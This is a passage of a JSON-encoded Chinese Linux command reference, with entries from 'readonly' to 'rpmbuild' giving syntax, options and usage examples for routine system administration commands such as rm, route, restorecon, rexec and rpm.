\n\n使用readonly命令显示系统中所有的已经定义的只读变量，输入如下命令：\n\n```\n[root@localhost ~]# readonly     #显示只读变量\ndeclare -ar BASH_VERSINFO\u003d\u0027([0]\u003d\"3\" [1]\u003d\"2\" [2]\u003d\"25\" [3]\u003d\"1\" [4]\u003d\"release\" [5]\u003d\"i686-redhat-linux-gnu\")\u0027\ndeclare -ir EUID\u003d\"0\"\ndeclare -ir PPID\u003d\"31436\"\ndeclare -r SHELLOPTS\u003d\"braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor\"\ndeclare -ir UID\u003d\"0\"\n```\n\n对于只读变量而言，若用户对其值进行修改，则会立即报错。例如，使用该指令定义一个只读变量\"test\"，并且将其值初始化为\"ok\"，输入如下命令：\n\n```\n[root@localhost ~]# readonly test\u003d\u0027ok\u0027        #定义只读变量并初始化 \n```\n\n那么当用户直接修改该只读变量时，就会被报错，如下所示：\n\n```\n[root@localhost ~]# test\u003d\u0027my\u0027                 #试图修改只读变量的值\n-bash: test: readonly variable\n```\n\n当用户试图修改只读变量的值时，会被提示该变量为只读变量。\n\n\n"},{"name":"reboot","categoryId":2,"data":"reboot\n\u003d\u003d\u003d\n\n重新启动正在运行的Linux操作系统\n\n## 补充说明\n\n**reboot命令** 用来重新启动正在运行的Linux操作系统。\n\n### 语法  \n\n```\nreboot(选项)\n```\n\n### 选项  \n\n```\n-d：重新开机时不把数据写入记录文件/var/tmp/wtmp。本参数具有“-n”参数效果；\n-f：强制重新开机，不调用shutdown指令的功能；\n-i：在重开机之前，先关闭所有网络界面；\n-n：重开机之前不检查是否有未结束的程序；\n-w：仅做测试，并不真正将系统重新开机，只会把重开机的数据写入/var/log目录下的wtmp记录文件。\n```\n\n### 实例  \n\n```\nreboot        //重开机。\nreboot -w     //做个重开机的模拟（只有纪录并不会真的重开机）。\n```\n\n\n"},{"name":"reject","categoryId":0,"data":"reject\n\u003d\u003d\u003d\n\n指示打印系统拒绝发往指定目标打印机的打印任务\n\n## 补充说明\n\n**reject命令** 属于CUPS套件，用于指示打印系统拒绝发往指定目标打印机的打印任务。\n\n### 语法  \n\n```\nreject(选项)(参数)\n```\n\n### 选项  \n\n```\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-h：指定连接服务器名和端口号；\n-r：指定拒绝打印任务的原因。\n```\n\n### 参数  \n\n目标：指定目标打印机。\n\n\n"},{"name":"rename","categoryId":0,"data":"rename\n\u003d\u003d\u003d\n\n用字符串替换的方式批量改变文件名\n\n## 补充说明\n\n**rename命令** 用字符串替换的方式批量改变文件名。\n\n### 语法  \n\n```\nrename(参数)\n```\n\n### 参数  \n\n```\n原字符串：将文件名需要替换的字符串；\n目标字符串：将文件名中含有的原字符替换成目标字符串；\n文件：指定要改变文件名的文件列表。\n```\n\n### 实例  \n\n将main1.c重命名为main.c\n\n```\nrename main1.c main.c main1.c\n```\n\n **rename支持通配符** \n\n```\n?  可替代单个字符\n*  可替代多个字符\n[charset]  可替代charset集中的任意单个字符\n```\n\n文件夹中有这些文件foo1, ..., foo9, foo10, ..., foo278\n\n如果使用`rename foo foo0 foo?`，会把foo1到foo9的文件重命名为foo01到foo09，重命名的文件只是有4个字符长度名称的文件，文件名中的foo被替换为foo0。\n\n如果使用`rename foo foo0 foo??`，foo01到foo99的所有文件都被重命名为foo001到foo099，只重命名5个字符长度名称的文件，文件名中的foo被替换为foo0。\n\n如果使用`rename foo foo0 foo*`，foo001到foo278的所有文件都被重命名为foo0001到foo0278，所有以foo开头的文件都被重命名。\n\n如果使用`rename foo0 foo foo0[2]*`，从foo0200到foo0278的所有文件都被重命名为foo200到foo278，文件名中的foo0被替换为foo。\n\n **rename支持正则表达式** \n\n字母的替换\n\n```\nrename \"s/AA/aa/\" *  //把文件名中的AA替换成aa\n```\n\n修改文件的后缀\n\n```\nrename \"s//.html//.php/\" *     //把.html 后缀的改成 .php后缀\n```\n\n批量添加文件后缀\n\n```\nrename \"s/$//.txt/\" *     //把所有的文件名都以txt结尾\n```\n\n批量删除文件名\n\n```\nrename \"s//.txt//\" *      //把所有以.txt结尾的文件名的.txt删掉\n```\n\n\n"},{"name":"renice","categoryId":2,"data":"renice\n\u003d\u003d\u003d\n\n修改正在运行的进程的调度优先级\n\n## 补充说明\n\n**renice命令** 可以修改正在运行的进程的调度优先级。预设是以程序识别码指定程序调整其优先权，您亦可以指定程序群组或用户名称调整优先权等级，并修改所有隶属于该程序群组或用户的程序的优先权。只有系统管理者可以改变其他用户程序的优先权，也仅有系统管理者可以设置负数等级。\n\n### 语法  \n\n```\nrenice(选项)(参数)\n```\n\n### 选项  \n\n```\n-g：指定进程组id；\n-p\u003c程序识别码\u003e：改变该程序的优先权等级，此参数为预设值。\n-u：指定开启进程的用户名。\n```\n\n### 参数  \n\n进程号：指定要修改优先级的进程。\n\n### 实例  \n\n将行程id为987及32的行程与行程拥有者为daemon及root的优先序号码加1：\n\n```\nrenice 1 987 -u daemon root -p 32\n```\n\n注意：每一个行程都有一个唯一的id。\n\n\n"},{"name":"repquota","categoryId":8,"data":"repquota\n\u003d\u003d\u003d\n\n报表的格式输出磁盘空间限制的状态\n\n## 补充说明\n\n**repquota命令** 以报表的格式输出指定分区，或者文件系统的磁盘配额信息。\n\n### 语法  \n\n```\nrepquota(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：列出在/etc/fstab文件里，有加入quota设置的分区的使用状况，包括用户和群组；\n-g：列出所有群组的磁盘空间限制；\n-u：列出所有用户的磁盘空间限制；\n-v：显示该用户或群组的所有空间限制。\n```\n\n### 参数  \n\n文件系统：要打印报表的文件系统或者对应的设备文件名。\n\n### 实例  \n\n显示所有文件系统的磁盘使用情况\n\n```\nrepquota -a\n```\n\n\n"},{"name":"restore","categoryId":10,"data":"restore\n\u003d\u003d\u003d\n\n所进行的操作和dump指令相反\n\n## 补充说明\n\n**restore命令** 是dump命令的逆过程，用于还原dump命令生成的备份文件。倾倒操作可用来备份文件，而还原操作则是写回这些已备份的文件。\n\n### 语法  \n\n```\nrestore(选项)\n```\n\n### 选项  \n\n```\n-b\u003c区块大小\u003e：设置区块大小，单位为Byte；\n-c：不检查倾倒操作的备份格式，仅准许读取使用旧格式的备份文件；\n-C：使用对比模式，将备份的文件与现行的文件相互对比；\n-D\u003c文件系统\u003e：允许用户指定文件系统的名称；\n-f\u003c备份文件\u003e：从指定的文件中读取备份数据，进行还原操作；\n-h：仅解除目录而不包括与该目录相关的所有文件；\n-i：使用互动模式，在进行还原操作时，restore指令将依序询问用户；\n-m：解开符合指定的inode编号的文件或目录而非用文件名称指定；\n-r：进行还原操作；\n-R：全面还原文件系统时，检查应从何处开始进行；\n-s\u003c文件编号\u003e：当备份数据超过一卷磁带时，用户可以指定备份文件的编号；\n-t：指定文件名称，若该文件已存在备份文件中，则列出它们的名称；\n-v：显示指令执行过程；\n-x：设置文件名称，且从指定的存储媒体里读入它们，若该文件已存在在备份文件中，则将其还原到文件系统内；\n-y：不询问任何问题，一律以同意回答并继续执行指令。\n```\n\n### 实例  \n\n```\ndump -9 -u -f /dev/hda3 /home/frank/\n```\n\n用restore命令来恢复备份：\n\n```\nrestore rf /dev/hda3 /home/frank\n```\n\n用restore命令来查看备份文件里的文件列表：\n\n```\nrestore ft /dev/hda3\n```\n\n\n"},{"name":"restorecon","categoryId":0,"data":"restorecon\n\u003d\u003d\u003d\n\n恢复文件的安全上下文\n\n## 补充说明\n\n**restorecon命令** 用来恢复SELinux文件属性即恢复文件的安全上下文。\n\n### 语法  \n\n```\nrestorecon [-iFnrRv] [-e excludedir ] [-o filename ] [-f filename | pathname...]\n```\n\n### 选项  \n\n```\n-i：忽略不存在的文件。\n-f：infilename 文件 infilename 中记录要处理的文件。\n-e：directory 排除目录。\n-R/-r：递归处理目录。\n-n：不改变文件标签。\n-o/outfilename：保存文件列表到 outfilename，在文件不正确情况下。\n-v：将过程显示到屏幕上。\n-F：强制恢复文件安全语境。\n```\n\n### 实例  \n\n假设CentOS安装了apache，网页默认的主目录是`/var/www/html`，我们经常遇到这样的问题，在其他目录中创建了一个网页文件，然后用mv移动到网页默认目录`/var/www/html`中，但是在浏览器中却打不开这个文件，这很可能是因为这个文件的SELinux配置信息是继承原来那个目录的，与`/var/www/html`目录不同，使用mv移动的时候，这个SELinux配置信息也一起移动过来了，从而导致无法打开页面，具体请看下面的实例：\n\n\u003cpre style\u003d\"color: rgb(0, 0, 0); font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px;\"\u003e/*使用CentOS举例,如果默认没有安装apache，确保网络连接，使用下面的命令安装*/\n[root@jsdig.com ~]# yum install httpd\n /*我们在root的家目录新建一个html文件*/\n[root@jsdig.com ~]# pwd\n/root\n\n[root@jsdig.com ~]# vi index.html\n\n/*随便输入一段文字，保存退出*/\nwelcome to www.jsdig.com\n\n/*将这个文件mv到网页默认目录下*/\n[root@jsdig.com ~]# mv index.html /var/www/html/\n\n/*\n * 这个时候我们使用firefox浏览器输入127.0.0.1/index.html发现打不开，\n * 查看一下SELinux的日志文件，发现了下面这一段报错信息，从这个报错信息不难看出，\n * 进程httpd访问网页主目录中的index.html时被SELinux阻止，原因是因为，SELinux配置信息不正确,\n * 正确的SELinux配置信息应该是scontext\u003d后面的部分，\n * 而index.html文件的SELinux配置信息却是tcontext\u003d后面的部分，\n * 从tcontext\u003d的第三段“admin_home_t”不难看出，这个文件的SELinux配置信息是root用户家目录的。\n */\ntype\u003dAVC msg\u003daudit(1378974214.610:465): avc:  denied  { open } for  pid\u003d2359 comm\u003d\"httpd\" path\u003d\"/var/www/html/index.html\" dev\u003d\"sda1\" ino\u003d1317685 scontext\u003dsystem_u:system_r:httpd_t:s0 tcontext\u003dunconfined_u:object_r:admin_home_t:s0 tclass\u003dfile\n\n/*使用ls -Z也可以看出,文件和目录的SELinux信息不匹配*/\n[root@jsdig.com html]# ls -Z /var/www/html/\n.... unconfined_u:object_r:admin_home_t:s0 index.html\n\n[root@jsdig.com html]# ls -Zd /var/www/html/\n.... system_u:object_r:httpd_sys_content_t:s0 /var/www/html/\n\n/*使用restorecon来恢复网页主目录中所有文件的SELinux配置信息(如果目标为一个目录，可以添加-R参数递归)*/\n[root@jsdig.com html]# restorecon -R /var/www/html/\n```\n\n\n"},{"name":"rev","categoryId":0,"data":"rev\n\u003d\u003d\u003d\n\n将文件内容以字符为单位反序输出\n\n## 补充说明\n\n**rev命令** 将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。\n\n### 语法  \n\n```\nrev(参数)\n```\n\n### 参数  \n\n文件：指定要反序显示内容的文件。\n\n### 实例  \n\n```\n[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n:INPUT DROP [48113:2690676]\n:FORWARD accept [0:0]\n:OUTPUT ACCEPT [3381959:1818595115]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n# Completed on Thu Dec 26 21:25:15 2013\n\n[root@localhost ~]# rev iptables.bak \n3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #\nretlif*\n]6760962:31184[ PORD TUPNI:\n]0:0[ TPECCA DRAWROF:\n]5115958181:9591833[ TPECCA TUPTUO:\n TPECCA j- ol i- TUPNI A-\n TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-\n TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-\n TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-\n TPECCA j- pmci p- TUPNI A-\n TPECCA j- ol o- TUPTUO A-\nTIMMOC\n3102 51:52:12 62 ceD uhT no detelpmoC #\n```\n\n\n"},{"name":"rexec","categoryId":0,"data":"rexec\n\u003d\u003d\u003d\n\n运程执行Linux系统下命令 \n\n## 补充说明\n\n**rexec命令** 用于在指定的远程Linux系统主机上执行命令，向远程rexec服务器发出执行命令的请求。\n\nrexec命令通过检查`$HOME/.netrc`文件（包含远程主机上使用的用户名和密码）来提供自动登录的功能。如果没有发现此类项或系统在安全方式下操作（参阅 securetcpip 命令），rexec命令提示输入一个远程主机的有效用户名和密码。这两种情况下，rexec均导致远程系统上的rexecd使用缺省的compat用户登录认证方法。rexecd不会为了备用的认证方法去查找`/etc/security/user`文件。也可以指定`-n`标志到rexec命令行上来重设自动登录功能。\n\n### 语法  \n\n```\nrexec(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：表示远程命令的标准错误与标准输出相同，不支持发送任意信号到远程进程；\n-l\u003c用户名\u003e：指定连接远程rexec服务器的用户名；\n-p\u003c密码\u003e：指定连接远程rexec服务器的密码；\n-n：明确地提示输入用户名和密码。\n```\n\n### 参数  \n\n*   远程主机：指定远程主机（ip地址或主机名）；\n*   命令：指定需要在远程主机上执行的命令。\n\n### 实例  \n\n要在一个远程主机上执行date命令，输入：\n\n```\nrexec host1 date\n```\n\ndate命令的输出现在显示在本地系统上。本示例中，在本地主机上的`$HOME/.netrc`文件包含远程主机上有效的用户名和密码。如果没有远程主机的`$HOME/.netrc`文件中的有效项，将提示输入登录标识和密码。输入所要求的登录信息后，date命令的输出显示在本地系统上。\n\n要重设自动登录功能并执行远程主机上的date命令，输入：\n\n```\nrexec -nhost1 date\n```\n\n出现提示时输入用户名和密码，date命令的输出现在显示在本地系统上。\n\n列出远程主机上另一个用户的目录，输入：\n\n```\nrexec host1 ls -l /home/karen\n```\n\n在远程主机host1上的karen 用户的目录列表显示在本地系统上。\n\n如果没有远程主机的`$HOME/.netrc`文件中的有效项，将提示您输入登录标识和密码。输入要求的登录信息后，在远程主机host1上的karen用户的目录列表显示在本地系统上。\n\n\n"},{"name":"rlogin","categoryId":2,"data":"rlogin\n\u003d\u003d\u003d\n\n从当前终端登录到远程Linux主机\n\n## 补充说明\n\n**rlogin命令** 用于从当前终端登录到远程Linux主机。\n\n### 语法  \n\n```\nrlogin(选项)(参数)\n```\n\n### 选项  \n\n```\n-8：允许输入8位字符数据；\n-e脱离字符\u003e：设置脱离字符；\n-E：滤除脱离字符；\n-l用户名称\u003e：指定要登入远端主机的用户名称；\n-L：使用litout模式进行远端登入阶段操作。\n```\n\n### 参数  \n\n远程主机：指定要登录的远程主机（ip地址或者域名）。\n\n\n"},{"name":"rm","categoryId":6,"data":"rm\n\u003d\u003d\u003d\n\n用于删除给定的文件和目录\n\n## 补充说明\n\n**rm**  **命令** 可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。\n\n注意：使用rm命令要格外小心。因为一旦删除了一个文件，就无法再恢复它。所以，在删除文件之前，最好再看一下文件的内容，确定是否真要删除。rm命令可以用-i选项，这个选项在使用文件扩展名字符删除多个文件时特别有用。使用这个选项，系统会要求你逐一确定是否要删除。这时，必须输入y并按Enter键，才能删除文件。如果仅按Enter键或其他字符，文件不会被删除。\n\n### 语法  \n\n```\nrm (选项)(参数)\n```\n\n### 选项  \n\n```\n-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；\n-f：强制删除文件或目录；\n-i：删除已有文件或目录之前先询问用户；\n-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；\n--preserve-root：不对根目录进行递归操作；\n-v：显示指令的详细执行过程。\n```\n\n### 参数  \n\n文件：指定被删除的文件列表，如果参数中含有目录，则必须加上`-r`或者`-R`选项。\n\n### 实例  \n\n交互式删除当前目录下的文件test和example\n\n```\nrm -i test example\nRemove test ?n（不删除文件test)\nRemove example ?y（删除文件example)\n```\n\n删除当前目录下除隐含文件外的所有文件和子目录\n\n```\n# rm -r *\n```\n\n应注意，这样做是非常危险的!\n\n\n"},{"name":"rmdir","categoryId":8,"data":"rmdir\n\u003d\u003d\u003d\n\n用来删除空目录\n\n## 补充说明\n\n**rmdir命令** 用来删除空目录。当目录不再被使用时，或者磁盘空间已到达使用限定值，就需要删除失去使用价值的目录。利用rmdir命令可以从一个目录中删除一个或多个空的子目录。该命令从一个目录中删除一个或多个子目录，其中dirname佬表示目录名。如果dirname中没有指定路径，则删除当前目录下由dirname指定的目录；如dirname中包含路径，则删除指定位置的目录。删除目录时，必须具有对其父目录的写权限。\n\n注意：子目录被删除之前应该是空目录。就是说，该目录中的所有文件必须用rm命令全部，另外，当前工作目录必须在被删除目录之上，不能是被删除目录本身，也不能是被删除目录的子目录。\n\n虽然还可以用带有`-r`选项的rm命令递归删除一个目录中的所有文件和该目录本身，但是这样做存在很大的危险性。\n\n### 语法  \n\n```\nrmdir(选项)(参数)\n```\n\n### 选项  \n\n```\n-p或--parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除；\n--ignore-fail-on-non-empty：此选项使rmdir命令忽略由于删除非空目录时导致的错误信息；\n-v或-verboes：显示命令的详细执行过程；\n--help：显示命令的帮助信息；\n--version：显示命令的版本信息。\n```\n\n### 参数  \n\n目录列表：要删除的空目录列表。当删除多个空目录时，目录名之间使用空格隔开。\n\n### 实例  \n\n删除子目录os_1和其父目录bin\n\n```\ncd /usr/meng/test\nrmdir -p bin/os_1\n```\n\n\n"},{"name":"rmmod","categoryId":4,"data":"rmmod\n\u003d\u003d\u003d\n\n从运行的内核中移除指定的内核模块\n\n## 补充说明\n\n**rmmod命令** 用于从当前运行的内核中移除指定的内核模块。执行rmmod指令，可删除不需要的模块。Linux操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。\n\n### 语法  \n\n```\nrmmod(选项)(参数)\n```\n\n### 选项  \n\n```\n-v：显示指令执行的详细信息；\n-f：强制移除模块，使用此选项比较危险；\n-w：等待着，直到模块能够被除时在移除模块；\n-s：向系统日志（syslog）发送错误信息。\n```\n\n### 参数  \n\n模块名：要移除的模块名称。\n\n### 实例  \n\n用rmmod命令主要用于卸载正在使用的Linux内核模块，与`modprobe -r`命令相似，如下所示：\n\n```\n[root@localhost boot]# lsmod | grep raid1\nraid1                  25153  0\n\n[root@localhost boot]# rmmod raid1\n[root@localhost boot]# lsmod | grep raid1\n```\n\n\n"},{"name":"route","categoryId":0,"data":"route\n\u003d\u003d\u003d\n\n显示并设置Linux中静态路由表\n\n## 补充说明\n\n**route命令** 用来显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。\n\n在Linux系统中设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的ip地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在`/etc/rc.local`中添加route命令来保证该路由设置永久有效。\n\n### 语法  \n\n```\nroute(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：设置地址类型；\n-C：打印将Linux核心的路由缓存；\n-v：详细信息模式；\n-n：不执行DNS反向查找，直接显示数字形式的IP地址；\n-e：netstat格式显示路由表；\n-net：到一个网络的路由表；\n-host：到一个主机的路由表。\n```\n\n### 参数  \n\n```\nAdd：增加指定的路由记录；\nDel：删除指定的路由记录；\nTarget：目的网络或目的主机；\ngw：设置默认网关；\nmss：设置TCP的最大区块长度（MSS），单位MB；\nwindow：指定通过路由表的TCP连接的TCP窗口大小；\ndev：路由记录所表示的网络接口。\n```\n\n### 实例  \n\n **显示当前路由：** \n\n```\n[root@localhost ~]# route\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n112.124.12.0    *               255.255.252.0   U     0      0        0 eth1\n10.160.0.0      *               255.255.240.0   U     0      0        0 eth0\n192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0\n172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth0\n10.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0\ndefault         112.124.15.247  0.0.0.0         UG    0      0        0 eth1\n\n[root@localhost ~]# route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n112.124.12.0    0.0.0.0         255.255.252.0   U     0      0        0 eth1\n10.160.0.0      0.0.0.0         255.255.240.0   U     0      0        0 eth0\n192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0\n172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth0\n10.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0\n0.0.0.0         112.124.15.247  0.0.0.0         UG    0      0        0 eth1\n```\n\n其中Flags为路由标志，标记当前网络节点的状态，Flags标志说明：\n\n*   U Up表示此路由当前为启动状态。\n*   H Host，表示此网关为一主机。\n*   G Gateway，表示此网关为一路由器。\n*   R Reinstate Route，使用动态路由重新初始化的路由。\n*   D Dynamically,此路由是动态性地写入。\n*   M Modified，此路由是由路由守护程序或导向器动态修改。\n*   ! 表示此路由当前为关闭状态。\n\n **添加网关/设置网关：** \n\n```\nroute add -net 224.0.0.0 netmask 240.0.0.0 dev eth0    #增加一条到达244.0.0.0的路由。\n```\n\n **屏蔽一条路由：** \n\n```\nroute add -net 224.0.0.0 netmask 240.0.0.0 reject     #增加一条屏蔽的路由，目的地址为224.x.x.x将被拒绝。\n```\n\n **删除路由记录：** \n\n```\nroute del -net 224.0.0.0 netmask 240.0.0.0\nroute del -net 224.0.0.0 netmask 240.0.0.0 reject\n```\n\n **删除和添加设置默认网关：** \n\n```\nroute del default gw 192.168.120.240\nroute add default gw 192.168.120.240\n```\n\n\n"},{"name":"rpm","categoryId":4,"data":"rpm\n\u003d\u003d\u003d\n\nRPM软件包的管理工具\n\n## 补充说明\n\n**rpm命令** 是RPM软件包的管理工具。rpm原本是Red Hat Linux发行版专门用来管理Linux各项套件的程序，由于它遵循GPL规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM套件管理方式的出现，让Linux易于安装，升级，间接提升了Linux的适用度。\n\n### 语法  \n\n```\nrpm(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：查询所有套件；\n-b\u003c完成阶段\u003e\u003c套件档\u003e+或-t \u003c完成阶段\u003e\u003c套件档\u003e+：设置包装套件的完成阶段，并指定套件档的文件名称；\n-c：只列出组态配置文件，本参数需配合\"-l\"参数使用；\n-d：只列出文本文件，本参数需配合\"-l\"参数使用；\n-e\u003c套件档\u003e或--erase\u003c套件档\u003e：删除指定的套件；\n-f\u003c文件\u003e+：查询拥有指定文件的套件；\n-h或--hash：套件安装时列出标记；\n-i：显示套件的相关信息；\n-i\u003c套件档\u003e或--install\u003c套件档\u003e：安装指定的套件档；\n-l：显示套件的文件列表；\n-p\u003c套件档\u003e+：查询指定的RPM套件档；\n-q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户；\n-R：显示套件的关联性信息；\n-s：显示文件状态，本参数需配合\"-l\"参数使用；\n-U\u003c套件档\u003e或--upgrade\u003c套件档\u003e：升级指定的套件档；\n-v：显示指令执行过程；\n-vv：详细显示指令执行过程，便于排错。\n```\n\n### 参数  \n\n软件包：指定要操纵的rpm软件包。\n\n### 实例  \n\n **如何安装rpm软件包** \n\nrpm软件包的安装可以使用程序rpm来完成。执行下面的命令：\n\n```\nrpm -ivh your-package.rpm\n```\n\n其中your-package.rpm是你要安装的rpm包的文件名，一般置于当前目录下。\n\n安装过程中可能出现下面的警告或者提示：\n\n```\n... conflict with ...\n```\n\n可能是要安装的包里有一些文件可能会覆盖现有的文件，缺省时这样的情况下是无法正确安装的可以用`rpm --force -i`强制安装即可\n\n```\n... is needed by ...\n... is not installed ...\n```\n\n此包需要的一些软件你没有安装可以用`rpm --nodeps -i`来忽略此信息，也就是说`rpm -i --force --nodeps`可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。\n\n **如何安装.src.rpm软件包** \n\n有些软件包是以.src.rpm结尾的，这类软件包是包含了源代码的rpm包，在安装时需要进行编译。这类软件包有两种安装方法：\n\n方法一：\n\n```\nrpm -i your-package.src.rpm\ncd /usr/src/redhat/SPECS\nrpmbuild -bp your-package.specs             #一个和你的软件包同名的specs文件\ncd /usr/src/redhat/BUILD/your-package/      #一个和你的软件包同名的目录\n./configure                                 #这一步和编译普通的源码软件一样，可以加上参数\nmake\nmake install\n```\n\n方法二：\n\n```\nrpm -i you-package.src.rpm\ncd /usr/src/redhat/SPECS\n```\n\n前两步和方法一相同\n\n```\nrpmbuild -bb your-package.specs       #一个和你的软件包同名的specs文件\n```\n\n这时在`/usr/src/redhat/RPM/i386/`（根据具体包的不同，也可能是i686,noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。\n\n执行`rpm -i new-package.rpm`即可安装完成。\n\n **如何卸载rpm软件包** \n\n使用命令`rpm -e`包名，包名可以包含版本号等信息，但是不可以有后缀.rpm，比如卸载软件包proftpd-1.2.8-1，可以使用下列格式：\n\n```\nrpm -e proftpd-1.2.8-1\nrpm -e proftpd-1.2.8\nrpm -e proftpd-\nrpm -e proftpd\n```\n\n不可以是下列格式：\n\n```\nrpm -e proftpd-1.2.8-1.i386.rpm\nrpm -e proftpd-1.2.8-1.i386\nrpm -e proftpd-1.2\nrpm -e proftpd-1\n```\n\n有时会出现一些错误或者警告：\n\n```\n... is needed by ...\n```\n\n这说明这个软件被其他软件需要，不能随便卸载，可以用rpm -e --nodeps强制卸载\n\n **如何不安装但是获取rpm包中的文件** \n\n使用工具rpm2cpio和cpio\n\n```\nrpm2cpio xxx.rpm | cpio -vi\nrpm2cpio xxx.rpm | cpio -idmv\nrpm2cpio xxx.rpm | cpio --extract --make-directories\n```\n\n参数i和extract相同，表示提取文件。v表示指示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。\n\n **如何查看与rpm包相关的文件和其他信息** \n\n下面所有的例子都假设使用软件包mysql-3.23.54a-11\n\n1、我的系统中安装了那些rpm软件包。\n\n```\nrpm -qa 讲列出所有安装过的包\n```\n\n如果要查找所有安装过的包含某个字符串sql的软件包\n\n```\nrpm -qa | grep sql\n```\n\n2、如何获得某个软件包的文件全名。\n\n```\nrpm -q mysql\n```\n\n可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本等信息。这个例子中可以得到信息mysql-3.23.54a-11\n\n3、一个rpm包中的文件安装到那里去了？\n\n```\nrpm -ql 包名\n```\n\n注意这里的是不包括.rpm后缀的软件包的名称，也就是说只能用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用which，比如：\n\n```\nwhich mysql\n```\n\n4、一个rpm包中包含那些文件。\n\n*   一个没有安装过的软件包，使用`rpm -qlp  **** .rpm`\n*   一个已经安装过的软件包，还可以使用`rpm -ql  **** .rpm`\n\n5、如何获取关于一个软件包的版本，用途等相关信息？\n\n*   一个没有安装过的软件包，使用`rpm -qip  **** .rpm`\n*   一个已经安装过的软件包，还可以使用`rpm -qi  **** .rpm`\n\n6、某个程序是哪个软件包安装的，或者哪个软件包包含这个程序。\n\n```\nrpm -qf `which 程序名`    #返回软件包的全名\nrpm -qif `which 程序名`   #返回软件包的有关信息\nrpm -qlf `which 程序名`   #返回软件包的文件列表\n```\n\n注意，这里不是引号，而是`，就是键盘左上角的那个键。也可以使用`rpm -qilf`，同时输出软件包信息和文件列表。\n\n7、某个文件是哪个软件包安装的，或者哪个软件包包含这个文件。\n\n注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用whereis或者which，然后使用`rpm -qf`例如：\n\n```\nwhereis ftptop\nftptop: /usr/bin/ftptop /usr/share/man/man1/ftptop.1.gz\n\nrpm -qf /usr/bin/ftptop\nproftpd-1.2.8-1\n\nrpm -qf /usr/share/doc/proftpd-1.2.8/rfc/rfc0959.txt\nproftpd-1.2.8-1\n```\n\n\n"},{"name":"rpm2cpio","categoryId":0,"data":"rpm2cpio\n\u003d\u003d\u003d\n\n将RPM软件包转换为cpio格式的文件\n\n## 补充说明\n\n**rpm2cpio命令** 用于将rpm软件包转换为cpio格式的文件。\n\n### 语法  \n\n```\nrpm2cpio(参数)\n```\n\n### 参数  \n\n文件：指定要转换的rpm包的文件名。\n\n### 实例  \n\n```\nrpm2cpio ../libstdc++-4.3.0-8.i386.rpm | cpio -idv\n```\n\n\n"},{"name":"rpmbuild","categoryId":0,"data":"rpmbuild\n\u003d\u003d\u003d\n\n创建RPM的二进制软件包和源码软件包\n\n## 补充说明\n\n**rpmbuild命令** 被用于创建rpm的二进制软件包和源码软件包。\n\n### 语法  \n\n```\nrpmbuild(选项)\n```\n\n### 选项  \n\n```\n--initdb：初始化RPM数据库；\n--rebuilddb：从已安装的包头文件，方向重建RPM数据库；\n-ba：创建二进制和源代码包；\n-bb：创建二进制代码包；\n-bs：创建源代码包。\n```\n\n### 实例  \n\n```\nrpmbuild -ba 